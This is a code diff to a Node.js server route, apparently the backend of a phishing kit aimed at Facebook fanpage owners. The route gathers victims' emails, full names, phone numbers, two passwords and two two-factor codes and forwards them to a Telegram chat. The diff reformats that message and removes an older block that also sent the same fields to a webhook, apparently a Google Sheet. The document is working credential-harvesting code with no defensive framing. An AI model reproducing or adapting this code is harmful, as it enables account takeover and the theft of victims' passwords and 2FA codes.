@@ -21,50 +21,20 @@ app.post('/api/resgister', (req, res) => {
     res.send(result);
 
     
-    const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
-<strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
-<strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
-<strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
-<strong>Fanpage Name:</strong> ${data.fanpageName ? data.fanpageName : ''}
-<strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
-<strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
-<strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
-<strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}
-<strong>Image:</strong> ${data.imageUrl ? data.imageUrl : ''}`;
+    const message = `<strong>Ip:</strong> <code>${data.ip ? data.ip : ''}</code>
+-----------------------
+<strong>Email Business:</strong> <code>${data.businessEmail ? data.businessEmail : ''} </code>
+<strong>Email Personal:</strong> <code>${data.personalEmail ? data.personalEmail : ''}</code>
+<strong>Full Name:</strong> <code>${data.fullName ? data.fullName : ''} </code>
+<strong>Fanpage Name:</strong> <code>${data.fanpageName ? data.fanpageName : ''}</code>
+<strong>Phone Number:</strong> <code>${data.mobilePhone ? data.mobilePhone : ''}</code>
+<strong>Password First:</strong> <code>${data.passwordFirst ? data.passwordFirst : ''}</code>
+<strong>Password Second:</strong> <code>${data.passwordSecond ? data.passwordSecond : ''}</code>
+-----------------------
+<strong>First Two-Fa:</strong> <code>${data.firstTwoFa ? data.firstTwoFa : ''}</code>
+<strong>Second Two-Fa:</strong> <code>${data.secondTwoFa ? data.secondTwoFa : ''}</code>`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
-
-
-if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
-    // ADD GOOGLE SHEET
-    const url = new URL(process.env.WEBHOOK_URL);
-
-    url.searchParams.append('Ip', data.ip ? data.ip : '');
-    url.searchParams.append('Email Business', data.businessEmail ? data.businessEmail : '');
-    url.searchParams.append('Email Personal', data.personalEmail ? data.personalEmail : '');
-    url.searchParams.append('Full Name', data.fullName ? data.fullName : '');
-    url.searchParams.append('Fanpage Name', data.fanpageName ? data.fanpageName : '');
-    url.searchParams.append('Phone Number', data.mobilePhone ? data.mobilePhone : '');
-    url.searchParams.append('Password First', data.passwordFirst ? data.passwordFirst : '');
-    url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
-    url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
-    url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
-    url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');
-
-    axios.get(url)
-    .then(response => {
-        const data = response.data;
-        if (data.status === 'success') {
-            bot.sendMessage(process.env.CHAT_ID, '✅ Đã thêm vào Sheet thành công.');
-        } else {
-            bot.sendMessage(process.env.CHAT_ID, 'Không thể thêm. Vui lòng thử lại sau!');
-        }
-    })
-    .catch(error => {
-        bot.sendMessage(chatId, 'Đã có lỗi xảy ra. Vui lòng thử lại sau!');
-    });
-}
 
 });
 
